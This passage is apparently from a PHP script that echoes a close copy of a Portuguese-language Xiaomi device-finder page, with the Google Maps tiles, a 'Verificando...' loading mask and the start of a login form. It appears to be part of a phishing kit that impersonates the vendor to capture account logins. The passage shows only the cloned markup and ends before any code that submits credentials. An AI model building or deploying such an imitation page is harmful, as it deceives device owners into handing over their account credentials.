tz+xbfy176OzCUurbbyOAeGGxEZbdZh7WLyOA8SYW5hmWUt+NAEaZWMysbljvm7GxtosV1k8jgPgTCxcTq9iMrTCNobpyw/piRCx54CKLg8ceWe+5MUbCukfXJxZlcfT2uBnTcWssCese5QGLLMLCvizGUu7NiYR1j9yuOpyJlYyiKwnrjuRdpjOxWGQ1JCxxm/zaImsCYb0M+ExIWJCwIsoDF1m5SeeZriSse5JfXWSR1tak8zZ8WJCw4skd5nJiwaTz6D4TSljTl7u2yLljYjVyk8orXUUIS17SiSVsjZX4ufAxWljyInQsfRMLtqjEZT0N3BVhQd42E01+oZ1YEynrSQ8cFmVB3ugXTX7BO7FSrbNeHxVdDR4W5K3JkfjDAvbghZ39dsS2Xp7fHjXzarRfEqkCaPE5PT8HNZR1K/tPd6jRwoKStCLzl4Vhu8oADfi7Sj6yJK5PygYvaw1kCO+KsAbSU5bENY7MH1jr5qiQJewKPWVJXaPIetLCDU0h89OAwmrUsFxKDCc0MFdYPi7to1qRuiIsSStI+rJwE93fVaSwsJK0kolcmO7rClH/go6kdbs7GF4aaQYWZUlbyWh4RMpKAfH/rKrElYjuExhMONUxtbAkriBT+4aNcl12NYWyJC/XhMtSfquLsCZTlhTmmlhaqoevq8mV9a+dOjZiGAQCIPh8/0U7coCMsQIjAdqt4eZkVpmjrOxqhzV3WZwwuLTMKbpS1uUGjix/K0fxpqzV5X3KQdWVslaX9ygNUZHW4vJ6pS1qytpMDlQ64oO0NjMoqL5okdZuBrTUF19IazuDg6pFh7b208nnr6JPWizRlbieIc4SFytkJa+dxTwK24hlFNYRPFCpiIrp6wp40xMAAAAAAAAAAAAAAMANXtWKwNKXoVlwAAAAAElFTkSuQmCC" width="67.778%"><p class="title-3BUlK"><span>Nenhum item aqui</span></p><p class="message-BM5OB"><span>Selecione um dispositivo para localizá-lo.</span></p></div></div><div class="map-view-NKqXN" style="overflow: hidden;"><div style="height: 100%; width: 100%; position: absolute; top: 0px; left: 0px; background-color: rgb(229, 227, 223);"><div class="gm-style" style="position: absolute; z-index: 0; left: 0px; top: 0px; height: 100%; width: 100%; padding: 0px; border-width: 0px; margin: 0px;"><div tabindex="0" style="position: absolute; z-index: 0; left: 0px; top: 0px; height: 100%; width: 100%; padding: 0px; border-width: 0px; margin: 0px; cursor: url(&quot;https://maps.gstatic.com/mapfiles/openhand_8_8.cur&quot;), default; touch-action: none;"><div style="z-index: 1; position: absolute; left: 50%; top: 50%; width: 100%; transform: translate(0px, 0px);"><div style="position: absolute; left: 0px; top: 0px; z-index: 100; width: 100%;"><div style="position: absolute; left: 0px; top: 0px; z-index: 0;"><div style="position: absolute; z-index: 993; transform: matrix(1, 0, 0, 1, 0, 0);"><div style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: -256px; top: 0px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: -256px; top: -256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 0px; top: -256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 256px; top: -256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 256px; top: 0px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: -512px; top: 0px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: -512px; top: -256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 512px; top: -256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 512px; top: 0px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: -768px; top: 0px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: -768px; top: -256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 768px; top: -256px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div><div style="position: absolute; left: 768px; top: 0px; width: 256px; height: 256px;"><div style="width: 256px; height: 256px;"></div></div></div></div></div><div style="position: absolute; left: 0px; top: 0px; z-index: 101; width: 100%;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: 102; width: 100%;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: 103; width: 100%;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: 0;"><div style="position: absolute; z-index: 993; transform: matrix(1, 0, 0, 1, 0, 0);"><div style="position: absolute; left: 0px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i0!3i64!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=66225" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -256px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i127!3i64!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=9908" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -256px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i127!3i63!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=21742" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 0px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i0!3i63!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=78059" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 256px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i1!3i63!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=3202" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 256px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i1!3i64!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=122439" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -512px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i126!3i64!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=84765" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -512px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i126!3i63!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=96599" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 512px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i2!3i63!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=59416" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 512px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i2!3i64!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=47582" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -768px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i125!3i64!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=28551" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -768px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i125!3i63!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=40385" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 768px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i3!3i63!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=115630" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 768px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear 0s;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i7!2i3!3i64!4i256!2m3!1e0!2sm!3i498210647!3m17!2spt-BR!3sUS!5e18!12m4!1e68!2m2!1sset!2sRoadmap!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcy50OjMzfHMuZTpsfHAudjpvZmY!4e0!5m1!5f2&amp;client=gme-xiaomiinc&amp;token=103796" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div></div></div></div><div class="gm-style-pbc" style="z-index: 2; position: absolute; height: 100%; width: 100%; padding: 0px; border-width: 0px; margin: 0px; left: 0px; top: 0px; opacity: 0;"><p class="gm-style-pbt"></p></div><div style="z-index: 3; position: absolute; height: 100%; width: 100%; padding: 0px; border-width: 0px; margin: 0px; left: 0px; top: 0px; touch-action: pan-x pan-y;"><div style="z-index: 4; position: absolute; left: 50%; top: 50%; width: 100%; transform: translate(0px, 0px);"><div style="position: absolute; left: 0px; top: 0px; z-index: 104; width: 100%;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: 105; width: 100%;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: 106; width: 100%;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: 107; width: 100%;"></div></div></div></div><iframe aria-hidden="true" frameborder="0" style="z-index: -1; position: absolute; width: 100%; height: 100%; top: 0px; left: 0px; border: none;" src="about:blank"></iframe><div style="margin-left: 5px; margin-right: 5px; z-index: 1000000; position: absolute; left: 0px; bottom: 0px;"><a target="_blank" rel="noopener" href="https://maps.google.com/maps?ll=0,180&amp;z=7&amp;t=m&amp;hl=pt-BR&amp;gl=US&amp;mapclient=apiv3" title="Abrir esta área no Google Maps (abre uma nova janela)" style="position: static; overflow: visible; float: none; display: inline;"><div style="width: 66px; height: 26px; cursor: pointer;"><img alt="" src="https://maps.gstatic.com/mapfiles/api-3/images/google4_hdpi.png" draggable="false" style="position: absolute; left: 0px; top: 0px; width: 66px; height: 26px; user-select: none; border: 0px; padding: 0px; margin: 0px;"></div></a></div><div style="background-color: white; padding: 15px 21px; border: 1px solid rgb(171, 171, 171); font-family: Roboto, Arial, sans-serif; color: rgb(34, 34, 34); box-sizing: border-box; box-shadow: rgba(0, 0, 0, 0.2) 0px 4px 16px; z-index: 10000002; display: none; width: 300px; height: 180px; position: absolute; left: 618px; top: 129px;"><div style="padding: 0px 0px 10px; font-size: 16px; box-sizing: border-box;">Dados do mapa</div><div style="font-size: 13px;">Dados cartográficos ©2020</div><button draggable="false" title="Fechar" aria-label="Fechar" type="button" class="gm-ui-hover-effect" style="background: none; display: block; border: 0px; margin: 0px; padding: 0px; position: absolute; cursor: pointer; user-select: none; top: 0px; right: 0px; width: 37px; height: 37px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2224px%22%20height%3D%2224px%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22%23000000%22%3E%0A%20%20%20%20%3Cpath%20d%3D%22M19%206.41L17.59%205%2012%2010.59%206.41%205%205%206.41%2010.59%2012%205%2017.59%206.41%2019%2012%2013.41%2017.59%2019%2019%2017.59%2013.41%2012z%22%2F%3E%0A%20%20%20%20%3Cpath%20d%3D%22M0%200h24v24H0z%22%20fill%3D%22none%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="pointer-events: none; display: block; width: 13px; height: 13px; margin: 12px;"></button></div><div class="gmnoprint" style="z-index: 1000001; position: absolute; right: 166px; bottom: 0px; width: 134px;"><div draggable="false" class="gm-style-cc" style="user-select: none; height: 14px; line-height: 14px;"><div style="opacity: 0.7; width: 100%; height: 100%; position: absolute;"><div style="width: 1px;"></div><div style="background-color: rgb(245, 245, 245); width: auto; height: 100%; margin-left: 1px;"></div></div><div style="position: relative; padding-right: 6px; padding-left: 6px; box-sizing: border-box; font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); white-space: nowrap; direction: ltr; text-align: right; vertical-align: middle; display: inline-block;"><a style="text-decoration: none; cursor: pointer; display: none;">Dados do mapa</a><span>Dados cartográficos ©2020</span></div></div></div><div class="gmnoscreen" style="position: absolute; right: 0px; bottom: 0px;"><div style="font-family: Roboto, Arial, sans-serif; font-size: 11px; color: rgb(68, 68, 68); direction: ltr; text-align: right; background-color: rgb(245, 245, 245);">Dados cartográficos ©2020</div></div><div class="gmnoprint gm-style-cc" draggable="false" style="z-index: 1000001; user-select: none; height: 14px; line-height: 14px; position: absolute; right: 0px; bottom: 0px;"><div style="opacity: 0.7; width: 100%; height: 100%; position: absolute;"><div style="width: 1px;"></div><div style="background-color: rgb(245, 245, 245); width: auto; height: 100%; margin-left: 1px;"></div></div><div style="position: relative; padding-right: 6px; padding-left: 6px; box-sizing: border-box; font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); white-space: nowrap; direction: ltr; text-align: right; vertical-align: middle; display: inline-block;"><a href="https://www.google.com/intl/pt-BR_US/help/terms_maps.html" target="_blank" rel="noopener" style="text-decoration: none; cursor: pointer; color: rgb(68, 68, 68);">Termos de Uso</a></div></div><button draggable="false" title="Ativar a visualização em tela cheia" aria-label="Ativar a visualização em tela cheia" type="button" class="gm-control-active gm-fullscreen-control" style="background: none rgb(255, 255, 255); border: 0px; margin: 10px; padding: 0px; position: absolute; cursor: pointer; user-select: none; border-radius: 2px; height: 40px; width: 40px; box-shadow: rgba(0, 0, 0, 0.3) 0px 1px 4px -1px; overflow: hidden; display: none; top: 0px; right: 0px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%20018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23666%22%20d%3D%22M0%2C0v2v4h2V2h4V0H2H0z%20M16%2C0h-4v2h4v4h2V2V0H16z%20M16%2C16h-4v2h4h2v-2v-4h-2V16z%20M2%2C12H0v4v2h2h4v-2H2V12z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23333%22%20d%3D%22M0%2C0v2v4h2V2h4V0H2H0z%20M16%2C0h-4v2h4v4h2V2V0H16z%20M16%2C16h-4v2h4h2v-2v-4h-2V16z%20M2%2C12H0v4v2h2h4v-2H2V12z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23111%22%20d%3D%22M0%2C0v2v4h2V2h4V0H2H0z%20M16%2C0h-4v2h4v4h2V2V0H16z%20M16%2C16h-4v2h4h2v-2v-4h-2V16z%20M2%2C12H0v4v2h2h4v-2H2V12z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"></button><div draggable="false" class="gm-style-cc" style="user-select: none; height: 14px; line-height: 14px; display: none; position: absolute; right: 0px; bottom: 0px;"><div style="opacity: 0.7; width: 100%; height: 100%; position: absolute;"><div style="width: 1px;"></div><div style="background-color: rgb(245, 245, 245); width: auto; height: 100%; margin-left: 1px;"></div></div><div style="position: relative; padding-right: 6px; padding-left: 6px; box-sizing: border-box; font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); white-space: nowrap; direction: ltr; text-align: right; vertical-align: middle; display: inline-block;"><a target="_blank" rel="noopener" title="Informar erros no mapa ou nas imagens para o Google" href="https://www.google.com/maps/@0,180,7z/data=!10m1!1e1!12b1?source=apiv3&amp;rapsrc=apiv3" style="font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); text-decoration: none; position: relative;">Informar erro no mapa</a></div></div><div class="gmnoprint gm-bundled-control" draggable="false" controlwidth="40" controlheight="81" style="margin: 10px; user-select: none; position: absolute; left: 0px; top: 169px;"><div class="gmnoprint" controlwidth="40" controlheight="81" style="position: absolute; left: 0px; top: 0px;"><div draggable="false" style="user-select: none; box-shadow: rgba(0, 0, 0, 0.3) 0px 1px 4px -1px; border-radius: 2px; cursor: pointer; background-color: rgb(255, 255, 255); width: 40px; height: 81px;"><button draggable="false" title="Aumentar o zoom" aria-label="Aumentar o zoom" type="button" class="gm-control-active" style="background: none; display: block; border: 0px; margin: 0px; padding: 0px; position: relative; cursor: pointer; user-select: none; overflow: hidden; width: 40px; height: 40px; top: 0px; left: 0px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpolygon%20fill%3D%22%23666%22%20points%3D%2218%2C7%2011%2C7%2011%2C0%207%2C0%207%2C7%200%2C7%200%2C11%207%2C11%207%2C18%2011%2C18%2011%2C11%2018%2C11%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpolygon%20fill%3D%22%23333%22%20points%3D%2218%2C7%2011%2C7%2011%2C0%207%2C0%207%2C7%200%2C7%200%2C11%207%2C11%207%2C18%2011%2C18%2011%2C11%2018%2C11%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpolygon%20fill%3D%22%23111%22%20points%3D%2218%2C7%2011%2C7%2011%2C0%207%2C0%207%2C7%200%2C7%200%2C11%207%2C11%207%2C18%2011%2C18%2011%2C11%2018%2C11%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"></button><div style="position: relative; overflow: hidden; width: 30px; height: 1px; margin: 0px 5px; background-color: rgb(230, 230, 230); top: 0px;"></div><button draggable="false" title="Diminuir o zoom" aria-label="Diminuir o zoom" type="button" class="gm-control-active" style="background: none; display: block; border: 0px; margin: 0px; padding: 0px; position: relative; cursor: pointer; user-select: none; overflow: hidden; width: 40px; height: 40px; top: 0px; left: 0px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23666%22%20d%3D%22M0%2C7h18v4H0V7z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23333%22%20d%3D%22M0%2C7h18v4H0V7z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23111%22%20d%3D%22M0%2C7h18v4H0V7z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"></button></div></div></div><div class="gmnoprint" style="margin: 10px; z-index: 0; position: absolute; cursor: pointer; bottom: 14px; right: 0px;"><div class="gm-style-mtc" style="float: left; position: relative;"><div role="button" tabindex="0" title="Mostrar mapa de ruas" aria-label="Mostrar mapa de ruas" aria-pressed="true" draggable="false" style="direction: ltr; overflow: hidden; text-align: center; height: 40px; display: table-cell; vertical-align: middle; position: relative; color: rgb(0, 0, 0); font-family: Roboto, Arial, sans-serif; user-select: none; font-size: 18px; background-color: rgb(255, 255, 255); padding: 0px 17px; border-bottom-left-radius: 2px; border-top-left-radius: 2px; background-clip: padding-box; box-shadow: rgba(0, 0, 0, 0.3) 0px 1px 4px -1px; min-width: 46px; font-weight: 500;">Mapa</div></div><div class="gm-style-mtc" style="float: left; position: relative;"><div role="button" tabindex="0" title="Mostrar imagens com nomes de rua" aria-label="Mostrar imagens com nomes de rua" aria-pressed="false" draggable="false" style="direction: ltr; overflow: hidden; text-align: center; height: 40px; display: table-cell; vertical-align: middle; position: relative; color: rgb(86, 86, 86); font-family: Roboto, Arial, sans-serif; user-select: none; font-size: 18px; background-color: rgb(255, 255, 255); padding: 0px 17px; border-bottom-right-radius: 2px; border-top-right-radius: 2px; background-clip: padding-box; box-shadow: rgba(0, 0, 0, 0.3) 0px 1px 4px -1px; min-width: 60px; border-left: 0px;">Híbrido</div></div></div><div draggable="false" class="gm-style-cc" style="position: absolute; user-select: none; height: 14px; line-height: 14px; right: 79px; bottom: 0px;"><div style="opacity: 0.7; width: 100%; height: 100%; position: absolute;"><div style="width: 1px;"></div><div style="background-color: rgb(245, 245, 245); width: auto; height: 100%; margin-left: 1px;"></div></div><div style="position: relative; padding-right: 6px; padding-left: 6px; box-sizing: border-box; font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); white-space: nowrap; direction: ltr; text-align: right; vertical-align: middle; display: inline-block;"><span>50 km&nbsp;</span><div style="position: relative; display: inline-block; height: 8px; bottom: -1px; width: 45px;"><div style="width: 100%; height: 4px; position: absolute; left: 0px; top: 0px;"></div><div style="width: 4px; height: 8px; left: 0px; top: 0px; background-color: rgb(255, 255, 255);"></div><div style="width: 4px; height: 8px; position: absolute; background-color: rgb(255, 255, 255); right: 0px; bottom: 0px;"></div><div style="position: absolute; background-color: rgb(102, 102, 102); height: 2px; left: 1px; bottom: 1px; right: 1px;"></div><div style="position: absolute; width: 2px; height: 6px; left: 1px; top: 1px; background-color: rgb(102, 102, 102);"></div><div style="width: 2px; height: 6px; position: absolute; background-color: rgb(102, 102, 102); bottom: 1px; right: 1px;"></div></div></div></div></div></div></div></div></div></div></div>';
	$html .= "\n" . '<div id="oldbrowser" class="oldbrowser" style="display:none">';
	$html .= "\n" . '<div class="content">';
	$html .= "\n" . '<div class="title"></div>';
	$html .= "\n" . '<div class="desc-1"></div>';
	$html .= "\n" . '<div class="desc-2"></div>';
	$html .= "\n" . '';
	$html .= "\n" . '</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '';
	$html .= "\n" . '<div><div class="ant-message"><span></span></div></div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '';
	$html .= "\n" . '';
	$html .= "\n" . '<div id="Principal">';
	$html .= "\n" . '<div class="wrapper">';
	$html .= "\n" . '<!-- loading -->';
	$html .= "\n" . '<div class="popup_mask acquirePhoneMask" style="display:none;" id="loadingMask">';
	$html .= "\n" . '<div class="bkc"></div>';
	$html .= "\n" . '<div class="mod_wrap loadingmask"> </div>';
	$html .= "\n" . '<div class="loadingTips">Verificando...</div>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<!--bg_banner_start-->';
	$html .= "\n" . '<div class="bgiframe">';
	$html .= "\n" . '<iframe name="ifr" style="height:100%" width="100%" height="686" src="about:blank" id="bgiframe" frameborder="0" scrolling="no"></iframe>';
	$html .= "\n" . '</div>';
	$html .= "\n" . '<!--bg_banner_end-->';
	$html .= "\n" . '<div class="wrap">';
	$html .= "\n" . '<div class="layout_panel">';
	$html .= "\n" . '<div class="layout" id="layout">';
	$html .= "\n" . '<div id="main-content">';
	$html .= "\n" . '<!--表单输入登录-->';
	$html .= "\n" . '<div class="mainbox form-panel" id="login-main">';
	$html .= "\n" . '<div id="custom_display_2">';
	$html .= "\n" . '<a class="ercode" id="qrcode-trigger" href="javascript:void(0)"></a>';
